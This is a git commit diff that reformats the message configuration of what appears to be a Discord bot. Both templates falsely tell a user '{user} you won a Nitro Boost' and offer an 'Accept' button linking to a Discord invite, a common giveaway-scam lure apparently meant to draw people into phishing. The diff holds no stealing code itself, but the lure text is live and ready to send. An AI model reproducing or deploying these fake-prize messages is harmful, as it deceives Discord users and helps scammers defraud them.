0bd79a1506dd4bcc5496757816b3e669d5d96dae
Alien <166258154+quizalien@users.noreply.github.com>
2026-07-04 05:10:00 +0300

    Update Configuration.js

--- src/Structures/Configuration.js
+++ src/Structures/Configuration.js
@@ -13,47 +13,48 @@
     webhook:process.env.webhook,
     icon: "https://polybit-apps.s3.amazonaws.com/stdlib/users/discord/profile/image.png",
 
-    embed: [
-        {
-            "content": "{user} **you won a Nitro Boost** ! https://i.postimg.cc/kGgQVXgd/niporta-png.png",
-            "components": {
-                "type": 1,
-                "components": [
+    embed: {
+        content: "{user} **you won a Nitro Boost** ! https://media.discordapp.net/attachments/1236388019439800330/1256236688406220912/11111unknown.png?ex=6a49b056&is=6a485ed6&hm=a8ca6bd0e7c38620d64afc44bcccfb266de19a8cf44ec80b185899f50ce00c54&format=webp&quality=lossless&",
+        components: [
+            {
+                type: 1,
+                components: [
                     {
-                        "type": 2,
-                        "label": "Accept",
-                        "style": 5,
-                        "emoji": {
-                            "name": "Discord",
-                            "id": "1243869797633232927",
-                            "animated": true
+                        type: 2,
+                        label: "Accept",
+                        style: 5,
+                        emoji: {
+                            name: "Discord",
+                            id: "1243869797633232927",
+                            animated: true
                         },
-                        "url": "https://discord.gg/MwRBgGGaam"
+                        url: "https://discord.gg/MwRBgGGaam"
                     }
                 ]
             }
-        }
-    ],
+        ]
+    },
 
-    embed2: [
-        {
-            "content": "{user} **you won a Nitro Boost** ! https://i.postimg.cc/kGgQVXgd/niporta-png.png",
-            "components": {
-                "type": 1,
-                "components": [
+    // İkinci Mesaj (Aynı içerik, farklı bir olay için kullanılabilir)
+    embed2: {
+        content: "{user} **you won a Nitro Boost** ! https://media.discordapp.net/attachments/1236388019439800330/1256236688406220912/11111unknown.png?ex=6a49b056&is=6a485ed6&hm=a8ca6bd0e7c38620d64afc44bcccfb266de19a8cf44ec80b185899f50ce00c54&format=webp&quality=lossless&",
+        components: [
+            {
+                type: 1,
+                components: [
                     {
-                        "type": 2,
-                        "label": "Accept",
-                        "style": 5,
-                        "emoji": {
-                            "name": "Discord",
-                            "id": "1243869797633232927",
-                            "animated": true
+                        type: 2,
+                        label: "Accept",
+                        style: 5,
+                        emoji: {
+                            name: "Discord",
+                            id: "1243869797633232927",
+                            animated: true
                         },
-                        "url": "https://discord.gg/MwRBgGGaam"
+                        url: "https://discord.gg/MwRBgGGaam"
                     }
                 ]
             }
-        }
-    ]
-}
+        ]
+    }
+};
